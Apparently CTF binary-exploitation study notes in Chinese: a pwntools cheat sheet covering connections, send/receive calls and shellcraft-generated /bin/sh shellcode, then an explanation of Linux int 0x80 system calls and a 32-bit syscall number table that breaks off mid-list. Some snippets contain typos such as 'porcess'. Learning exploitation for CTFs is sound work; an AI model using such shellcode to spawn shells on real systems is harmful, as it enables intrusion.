<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python             #python语言标记</span></span><br><span class="line">from pwn import *                 <span class="comment">#导入所有模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">连接：</span><br><span class="line">sh = porcess(<span class="string">&quot;./level0&quot;</span>)          <span class="comment">#本地</span></span><br><span class="line">sh = remote(<span class="string">&quot;127.0.0.1&quot;</span>,10001)    <span class="comment">#远程</span></span><br><span class="line">sh.close()                        <span class="comment">#关闭连接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO模块：</span><br><span class="line">sh.send(data)                     <span class="comment">#发送数据</span></span><br><span class="line">sh.sendline(data)  				  <span class="comment">#发送一行数据，相当于在数据后面加\n</span></span><br><span class="line">sh.recv(numb = 2048, timeout = dufault)     <span class="comment">#接受数据，numb指定接收的字节，timeout指定超时</span></span><br><span class="line">sh.recvline(keepends=True)                  <span class="comment">#接受一行数据，keepends为是否保留行尾的\n</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello,World\n&quot;</span>,drop=fasle)    <span class="comment">#接受数据直到我们设置的标志出现</span></span><br><span class="line">sh.recvall()                      <span class="comment">#一直接收直到EOF</span></span><br><span class="line">sh.recvrepeat(timeout = default)  <span class="comment">#持续接受直到EOF或timeout</span></span><br><span class="line">sh.interactive()                  <span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Shellcode生成器：</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    nop</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br><span class="line">    /* push <span class="string">&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">...</span><br><span class="line"><span class="comment">#结合asm可以可以得到最终的pyaload</span></span><br><span class="line">from pwn import *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">或者</span><br><span class="line">from pwn import *</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">暂时只记这些</span><br></pre></td></tr></table></figure>



<br/>

<p>pwntools手册链接(复杂):<a target="_blank" rel="noopener" href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/intro.html">开始使用 — pwntools 3.5.0 documentation (pwntoolsdocinzh-cn.readthedocs.io)</a></p>
<p>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/355e4badab50">pwntools使用 - 简书 (jianshu.com)</a></p>
<p>链接：<a target="_blank" rel="noopener" href="https://ch4r1l3.github.io/2018/07/19/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E5%9B%9B%E7%AB%A0%E2%80%94%E2%80%94pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">cyclic</a></p>
<br/>

<br/>

<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">	1、应用程序调用库函数（API）；</span><br><span class="line">	2、API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</span><br><span class="line">	3、内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</span><br><span class="line">	4、系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</span><br><span class="line">	5、中断处理函数返回到 API 中；</span><br><span class="line">	6、API 将 EAX 返回给应用程序。</span><br><span class="line">	</span><br><span class="line">例：</span><br><span class="line">	movl <span class="variable">$0</span>, %ebx</span><br><span class="line">	movl <span class="variable">$1</span>, %eax</span><br><span class="line">	int <span class="variable">$0x80</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">linux 系统调用号表：</span><br><span class="line">	原文链接：https://blog.csdn.net/qq_29343201/article/details/52209588</span><br><span class="line">	</span><br><span class="line">	32位：</span><br><span class="line">		<span class="comment">#ifndef _ASM_X86_UNISTD_32_H</span></span><br><span class="line">		<span class="comment">#define _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line">        <span class="comment">#define __NR_restart_syscall 0</span></span><br><span class="line">        <span class="comment">#define __NR_exit 1</span></span><br><span class="line">        <span class="comment">#define __NR_fork 2</span></span><br><span class="line">        <span class="comment">#define __NR_read 3</span></span><br><span class="line">        <span class="comment">#define __NR_write 4</span></span><br><span class="line">        <span class="comment">#define __NR_open 5</span></span><br><span class="line">        <span class="comment">#define __NR_close 6</span></span><br><span class="line">        <span class="comment">#define __NR_waitpid 7</span></span><br><span class="line">        <span class="comment">#define __NR_creat 8</span></span><br><span class="line">        <span class="comment">#define __NR_link 9</span></span><br><span class="line">        <span class="comment">#define __NR_unlink 10</span></span><br><span class="line">        <span class="comment">#define __NR_execve 11</span></span><br><span class="line">        <span class="comment">#define __NR_chdir 12</span></span><br><span class="line">        <span class="comment">#define __NR_time 13</span></span><br><span class="line">        <span class="comment">#define __NR_mknod 14</span></span><br><span class="line">        <span class="comment">#define __NR_chmod 15</span></span><br><span class="line">        <span class="comment">#define __NR_lchown 16</span></span><br><span class="line">        <span class="comment">#define __NR_break 17</span></span><br><span class="line">        <span class="comment">#define __NR_oldstat 18</span></span><br><span class="line">        <span class="comment">#define __NR_lseek 19</span></span><br><span class="line">        <span class="comment">#define __NR_getpid 20</span></span><br><span class="line">        <span class="comment">#define __NR_mount 21</span></span><br><span class="line">        <span class="comment">#define __NR_umount 22</span></span><br><span class="line">        <span class="comment">#define __NR_setuid 23</span></span><br><span class="line">        <span class="comment">#define __NR_getuid 24</span></span><br><span class="line">        <span class="comment">#define __NR_stime 25</span></span><br><span class="line">        <span class="comment">#define __NR_ptrace 26</span></span><br><span class="line">        <span class="comment">#define __NR_alarm 27</span></span><br><span class="line">        <span class="comment">#define __NR_oldfstat 28</span></span><br><span class="line">        <span class="comment">#define __NR_pause 29</span></span><br><span class="line">        <span class="comment">#define __NR_utime 30</span></span><br><span class="line">        <span class="comment">#define __NR_stty 31</span></span><br><span class="line">        <span class="comment">#define __NR_gtty 32</span></span><br><span class="line">        <span class="comment">#define __NR_access 33</span></span><br><span class="line">        <span class="comment">#define __NR_nice 34</span></span><br><span class="line">        <span class="comment">#define __NR_ftime 35</span></span><br><span class="line">        <span class="comment">#define __NR_sync 36</span></span><br><span class="line">        <span class="comment">#define __NR_kill 37</span></span><br><span class="line">        <span class="comment">#define __NR_rename 38</span></span><br><span class="line">        <span class="comment">#define __NR_mkdir 39</span></span><br><span class="line">        <span class="comment">#define __NR_rmdir 40</span></span><br><span class="line">        <span class="comment">#define __NR_dup 41</span></span><br><span class="line">        <span class="comment">#define __NR_pipe 42</span></span><br><span class="line">        <span class="comment">#define __NR_times 43</span></span><br><span class="line">        <span class="comment">#define __NR_prof 44</span></span><br><span class="line">        <span class="comment">#define __NR_brk 45</span></span><br><span class="line">        <span class="comment">#define __NR_setgid 46</span></span><br><span class="line">        <span class="comment">#define __NR_getgid 47</span></span><br><span class="line">        <span class="comment">#define __NR_signal 48</span></span><br><span class="line">        <span class="comment">#define __NR_geteuid 49</span></span><br><span class="line">        <span class="comment">#define __NR_getegid 50</span></span><br><span class="line">        <span class="comment">#define __NR_acct 51</span></span><br><span class="line">        <span class="comment">#define __NR_umount2 52</span></span><br><span class="line">        <span class="comment">#define __NR_lock 53</span></span><br><span class="line">        <span class="comment">#define __NR_ioctl 54</span></span><br><span class="line">        <span class="comment">#define __NR_fcntl 55</span></span><br><span class="line">        <span class="comment">#define __NR_mpx 56</span></span><br><span class="line">        <span class="comment">#define __NR_setpgid 57</span></span><br><span class="line">        <span class="comment">#define __NR_ulimit 58</span></span><br><span class="line">        <span class="comment">#define __NR_oldolduname 59</span></span><br><span class="line">        <span class="comment">#define __NR_umask 60</span></span><br><span class="line">        <span class="comment">#define __NR_chroot 61</span></span><br><span class="line">        <span class="comment">#define __NR_ustat 62</span></span><br><span class="line">        <span class="comment">#define __NR_dup2 63</span></span><br><span class="line">        <span class="comment">#define __NR_getppid 64</span></span><br><span class="line">        <span class="comment">#define __NR_getpgrp 65</span></span><br><span class="line">        <span class="comment">#define __NR_setsid 66</span></span><br><span class="line">        <span class="comment">#define __NR_sigaction 67</span></span><br><span class="line">        <span class="comment">#define __NR_sgetmask 68</span></span><br><span class="line">        <span class="comment">#define __NR_ssetmask 69</span></span><br><span class="line">        <span class="comment">#define __NR_setreuid 70</span></span><br><span class="line">        <span class="comment">#define __NR_setregid 71</span></span><br><span class="line">        <span class="comment">#define __NR_sigsuspend 72</span></span><br><span class="line">        <span class="comment">#define __NR_sigpending 73</span></span><br><span class="line">        <span class="comment">#define __NR_sethostname 74</span></span><br><span class="line">        <span class="comment">#define __NR_setrlimit 75</span></span><br><span class="line">        <span class="comment">#define __NR_getrlimit 76</span></span><br><span class="line">        <span class="comment">#define __NR_getrusage 77</span></span><br><span class="line">        <span class="comment">#define __NR_gettimeofday 78</span></span><br><span class="line">        <span class="comment">#define __NR_settimeofday 79</span></span><br><span class="line">        <span class="comment">#define __NR_getgroups 80</span></span><br><span class="line">        <span class="comment">#define __NR_setgroups 81</span></span><br><span class="line">        <span class="comment">#define __NR_select 82</span></span><br><span class="line">        <span class="comment">#define __NR_symlink 83</span></span><br><span class="line">        <span class="comment">#define __NR_oldlstat 84</span></span><br><span class="line">        <span class="comment">#define __NR_readlink 85</span></span><br><span class="line">        <span class="comment">#define __NR_uselib 86</span></span><br><span class="line">        <span class="comment">#define __NR_swapon 87</span></span><br><span class="line">        <span class="comment">#define __NR_reboot 88</span></span><br><span class="line">        <span class="comment">#define __NR_readdir 89</span></span><br><span class="line">        <span class="comment">#define __NR_mmap 90</span></span><br><span class="line">        <span class="comment">#define __NR_munmap 91</span></span><br><span class="line">        <span class="comment">#define __NR_truncate 92</span></span><br><span class="line">        <span class="comment">#define __NR_ftruncate 93</span></span><br><span class="line">        <span class="comment">#define __NR_fchmod 94</span></span><br><span class="line">        <span class="comment">#define __NR_fchown 95</span></span><br><span class="line">        <span class="comment">#define __NR_getpriority 96</span></span><br><span class="line">        <span class="comment">#define __NR_setpriority 97</span></span><br><span class="line">        <span class="comment">#define __NR_profil 98</span></span><br><span class="line">        <span class="comment">#define __NR_statfs 99</span></span><br><span class="line">        <span class="comment">#define __NR_fstatfs 100</span></span><br><span class="line">        <span class="comment">#define __NR_ioperm 101</span></span><br><span class="line">        <span class="comment">#define __NR_socketcall 102</span></span><br><span class="line">        <span class="comment">#define __NR_syslog 103</span></span><br><span class="line">        <span class="comment">#define __NR_setitimer 104</span></span><br><span class="line">        <span class="comment">#define __NR_getitimer 105</span></span><br><span class="line">        <span class="comment">#define __NR_stat 106</span></span><br><span class="line">        <span class="comment">#define __NR_lstat 107</span></span><br><span class="line">        <span class="comment">#define __NR_fstat 108</span></span><br><span class="line">        <span class="comment">#define __NR_olduname 109</span></span><br><span class="line">        <span class="comment">#define __NR_iopl 110</span></span><br><span class="line">        <span class="comment">#define __NR_vhangup 111</span></span><br><span class="line">        <span class="comment">#define __NR_idle 112</span></span><br><span class="line">        <span class="comment">#define __NR_vm86old 113</span></span><br><span class="line">        <span class="comment">#define __NR_wait4 114</span></span><br><span class="line">        <span class="comment">#define __NR_swapoff 115</span></span><br><span class="line">        <span class="comment">#define __NR_sysinfo 116</span></span><br><span class="line">        <span class="comment">#define __NR_ipc 117</span></span><br><span class="line">        <span class="comment">#define __NR_fsync 118</span></span><br><span class="line">        <span class="comment">#define __NR_sigreturn 119</span></span><br><span class="line">        <span class="comment">#define __NR_clone 120</span></span><br><span class="line">        <span class="comment">#define __NR_setdomainname 121</span></span><br><span class="line">        <span class="comment">#define __NR_uname 122</span></span><br><span class="line">        <span class="comment">#define __NR_modify_ldt 123</span></span><br><span class="line">        <span class="comment">#define __NR_adjtimex 124</span></span><br><span class="line">        <span class="comment">#define __NR_mprotect 125</span></span><br><span class="line">        <span class="comment">#define __NR_sigprocmask 126</span></span><br><span class="line">        <span class="comment">#define __NR_create_module 127</span></span><br><span class="line">        <span class="comment">#define __NR_init_module 128</span></span><br><span 